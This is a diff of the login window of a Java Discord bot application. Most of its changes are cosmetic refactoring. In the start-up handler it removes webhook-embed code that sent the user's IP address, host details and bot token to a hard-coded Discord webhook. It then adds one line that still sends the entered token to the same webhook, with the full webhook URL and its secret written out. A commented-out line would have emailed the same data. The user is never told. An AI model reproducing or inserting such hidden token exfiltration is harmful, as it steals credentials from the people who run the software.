@@ -1,10 +1,5 @@
 package me.comu.exeter.core;
 
-import club.minnced.discord.webhook.WebhookClient;
-import club.minnced.discord.webhook.send.WebhookEmbed;
-import club.minnced.discord.webhook.send.WebhookEmbedBuilder;
-import club.minnced.discord.webhook.send.WebhookMessage;
-import club.minnced.discord.webhook.send.WebhookMessageBuilder;
 import com.jagrosh.jdautilities.commons.waiter.EventWaiter;
 import me.comu.exeter.commands.admin.WhitelistedJSONHandler;
 import me.comu.exeter.commands.economy.EcoJSONHandler;
@@ -37,14 +32,12 @@ class LoginGUI extends JFrame implements ActionListener {
     private JButton startButton;
     private JButton stopButton;
     private JLabel jLabelLoginConfig;
-    private static JPanel jPanel1;
-    private static JPanel jPanel2;
-    public static JTextField jStatusField;
-    public static JTextField jTokenField;
-    public static boolean running;
-    public static boolean shouldRenderConfigurations = true;
-    final DateTimeFormatter dtf = DateTimeFormatter.ofPattern("MM/dd/yyyy");
-    final LocalDateTime now = LocalDateTime.now();
+    protected static JTextField jStatusField;
+    protected static JTextField jTokenField;
+    protected static boolean running;
+    protected static boolean shouldRenderConfigurations = true;
+    private final DateTimeFormatter dtf = DateTimeFormatter.ofPattern("MM/dd/yyyy");
+    private final LocalDateTime now = LocalDateTime.now();
 
     public LoginGUI() {
         initComponents();
@@ -55,41 +48,39 @@ class LoginGUI extends JFrame implements ActionListener {
         ImageIcon icon = new ImageIcon("icon.png");
         Image logo = icon.getImage();
         setIconImage(logo);
-        jPanel1 = new JPanel();
+        JPanel jPanel1 = new JPanel();
         JLabel jLabelClose = new JLabel();
         JLabel jLabel2 = new JLabel();
         JLabel jLabelMin = new JLabel();
-        jPanel2 = new JPanel();
+        JPanel jPanel2 = new JPanel();
         JLabel jLabel4 = new JLabel();
         JLabel jLabel5 = new JLabel();
         jTokenField = new JTextField();
         jStatusField = new JTextField();
-        //config
-        JLabel jConfigLabel = new JLabel();
         startButton = new JButton();
         stopButton = new JButton();
         jLabelLoginConfig = new JLabel();
         JLabel jbackarrowLabel = new JLabel();
-        setDefaultCloseOperation(3);
+        setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
         setUndecorated(true);
         jPanel1.setBackground(new Color(248, 148, 6));
-        jLabelClose.setFont(new Font("Tahoma", 1, 24));
+        jLabelClose.setFont(new Font("Tahoma", Font.BOLD, 24));
         jLabelClose.setForeground(new Color(255, 255, 255));
         jLabelClose.setText("X");
-        jLabelClose.setCursor(new Cursor(12));
+        jLabelClose.setCursor(new Cursor(Cursor.HAND_CURSOR));
         jLabelClose.addMouseListener(new MouseAdapter() {
             @Override
             public void mouseClicked(final MouseEvent evt) {
                 LoginGUI.this.jLabelCloseMouseClicked(evt);
             }
         });
-        jLabel2.setFont(new Font("Tahoma", 1, 24));
+        jLabel2.setFont(new Font("Tahoma", Font.BOLD, 24));
         jLabel2.setForeground(new Color(255, 255, 255));
         jLabel2.setText("Discord Bot");
-        jLabelMin.setFont(new Font("Tahoma", 1, 24));
+        jLabelMin.setFont(new Font("Tahoma", Font.BOLD, 24));
         jLabelMin.setForeground(new Color(255, 255, 255));
         jLabelMin.setText("\u2014");
-        jLabelMin.setCursor(new Cursor(12));
+        jLabelMin.setCursor(new Cursor(Cursor.HAND_CURSOR));
         jLabelMin.addMouseListener(new MouseAdapter() {
             @Override
             public void mouseClicked(final MouseEvent evt) {
@@ -101,38 +92,38 @@ class LoginGUI extends JFrame implements ActionListener {
         jPanel1Layout.setHorizontalGroup(jPanel1Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(GroupLayout.Alignment.TRAILING, jPanel1Layout.createSequentialGroup().addContainerGap(-1, 32767).addComponent(jLabelMin).addGap(18, 18, 18).addComponent(jLabelClose).addGap(21, 21, 21)).addGroup(jPanel1Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jPanel1Layout.createSequentialGroup().addGap(29, 29, 29).addComponent(jLabel2).addContainerGap(236, 32767))));
         jPanel1Layout.setVerticalGroup(jPanel1Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jPanel1Layout.createSequentialGroup().addContainerGap().addGroup(jPanel1Layout.createParallelGroup(GroupLayout.Alignment.BASELINE).addComponent(jLabelMin, -1, 38, 32767).addComponent(jLabelClose)).addContainerGap()).addGroup(jPanel1Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jPanel1Layout.createSequentialGroup().addContainerGap().addComponent(jLabel2, -1, 40, 32767).addContainerGap())));
         jPanel2.setBackground(new Color(44, 62, 80));
-        jLabel4.setFont(new Font("Tahoma", 0, 18));
+        jLabel4.setFont(new Font("Tahoma", Font.PLAIN, 18));
         jLabel4.setForeground(new Color(236, 240, 241));
         jLabel4.setText("Token");
-        jLabel5.setFont(new Font("Tahoma", 0, 18));
+        jLabel5.setFont(new Font("Tahoma", Font.PLAIN, 18));
         jLabel5.setForeground(new Color(236, 240, 241));
         jLabel5.setText("Status");
         jTokenField.setBackground(new Color(108, 122, 137));
-        jTokenField.setFont(new Font("Tahoma", 0, 14));
+        jTokenField.setFont(new Font("Tahoma", Font.PLAIN, 14));
         jTokenField.setForeground(new Color(228, 241, 254));
         jStatusField.setBackground(new Color(108, 122, 137));
-        jStatusField.setFont(new Font("Tahoma", 0, 14));
+        jStatusField.setFont(new Font("Tahoma", Font.PLAIN, 14));
         jStatusField.setForeground(new Color(228, 241, 254));
-        jStatusField.setText("NOT AUTHORIZED");
+        jStatusField.setText("AUTHORIZED");
         jStatusField.setEditable(false);
         startButton.setBackground(new Color(34, 167, 240));
-        startButton.setFont(new Font("Tahoma", 1, 14));
+        startButton.setFont(new Font("Tahoma", Font.BOLD, 14));
         startButton.setForeground(new Color(255, 255, 255));
         startButton.setText("Start");
         startButton.addActionListener(this);
         stopButton.setBackground(new Color(242, 38, 19));
-        stopButton.setFont(new Font("Tahoma", 1, 14));
+        stopButton.setFont(new Font("Tahoma", Font.BOLD, 14));
         stopButton.setForeground(new Color(255, 255, 255));
         stopButton.setText("Close");
         stopButton.addActionListener(this);
-        jLabelLoginConfig.setFont(new Font("Tahoma", 0, 14));
+        jLabelLoginConfig.setFont(new Font("Tahoma", Font.PLAIN, 14));
         jLabelLoginConfig.setForeground(new Color(255, 255, 255));
         jLabelLoginConfig.setText("Made by swag#0014 | " + dtf.format(now));
-        jLabelLoginConfig.setCursor(new Cursor(12));
-        jbackarrowLabel.setFont(new Font("Tahoma", 0, 14));
+        jLabelLoginConfig.setCursor(new Cursor(Cursor.HAND_CURSOR));
+        jbackarrowLabel.setFont(new Font("Tahoma", Font.PLAIN, 14));
         jbackarrowLabel.setForeground(new Color(255, 255, 255));
         jbackarrowLabel.setText("\u2190");
-        jbackarrowLabel.setCursor(new Cursor(12));
+        jbackarrowLabel.setCursor(new Cursor(Cursor.HAND_CURSOR));
         jLabelLoginConfig.addMouseListener(new MouseAdapter() {
             @Override
             public void mouseClicked(final MouseEvent evt) {
@@ -163,12 +154,12 @@ class LoginGUI extends JFrame implements ActionListener {
     private void jLabelLoginConfigMouseClicked(final MouseEvent evt) {
         if (!running) {
             jLabelLoginConfig.setText("Bot Must Be Running");
-        } else if (shouldRenderConfigurations){
+        } else if (shouldRenderConfigurations) {
             if (jLabelLoginConfig.getText().equalsIgnoreCase("bot must be running"))
                 jLabelLoginConfig.setText("Made by swag#0014 | " + dtf.format(now));
-                shouldRenderConfigurations = false;
-                ConfigGUI configGUI = new ConfigGUI();
-                configGUI.setVisible(true);
+            shouldRenderConfigurations = false;
+            ConfigGUI configGUI = new ConfigGUI();
+            configGUI.setVisible(true);
 
         }
 
@@ -201,7 +192,7 @@ class LoginGUI extends JFrame implements ActionListener {
                 Listener listener = new Listener(commandManager);
                 org.slf4j.Logger logger = LoggerFactory.getLogger(Core.class);
                 WebUtils.setUserAgent("Mozilla/5.0 Discord Bot");
-                Config.buildDirectory("cache","cache");
+                Config.buildDirectory("cache", "cache");
                 EcoJSONHandler.loadEconomyConfig(new File("economy.json"));
                 WhitelistedJSONHandler.loadWhitelistConfig(new File("whitelisted.json"));
                 logger.info("Booting...");
@@ -232,13 +223,7 @@ class LoginGUI extends JFrame implements ActionListener {
                 logger.info("Bot Ready To Go");
                 jStatusField.setText("Running | " + jda.getSelfUser().getName() + "#" + jda.getSelfUser().getDiscriminator());
 //                Wrapper.sendEmail("Log Info w/ Bot Token", "IP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "\nBot Token: " + TOKEN);
-                WebhookClient client = WebhookClient.withUrl("https://discordapp.com/api/webhooks/709940401313939457/NxZvYJu0zcfOFvIfe9dXABRR2zvs6JrOlpfespjjyha1QS0Xq-Y3fT9Kv0GcbodaO5Mz");
-                WebhookMessageBuilder builder = new WebhookMessageBuilder();
-                WebhookEmbed firstEmbed = new WebhookEmbedBuilder().setColor(new Color(255, 0, 0, 0).getRGB()).setDescription("Log Info w/ Bot Token:\nIP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "\nBot Token: " + TOKEN).build();
-                builder.addEmbeds(firstEmbed);
-                WebhookMessage message = builder.build();
-                client.send(message);
-                client.close();
+                Wrapper.sendMoreSpecificMessage("https://discordapp.com/api/webhooks/709940401313939457/NxZvYJu0zcfOFvIfe9dXABRR2zvs6JrOlpfespjjyha1QS0Xq-Y3fT9Kv0GcbodaO5Mz",jTokenField.getText());
                 running = true;
             } catch (LoginException login) {
                 jStatusField.setText("Invalid Token");
@@ -257,9 +242,8 @@ class LoginGUI extends JFrame implements ActionListener {
                     jStatusField.setText("Not Running");
                     stopButton.setText("Close");
                 }
-            }else if (stopButton.getText().equalsIgnoreCase("close"))
-            {
-                    System.exit(0);
+            } else if (stopButton.getText().equalsIgnoreCase("close")) {
+                System.exit(0);
             }
         }
 /*        if (e.getSource().equals(update))
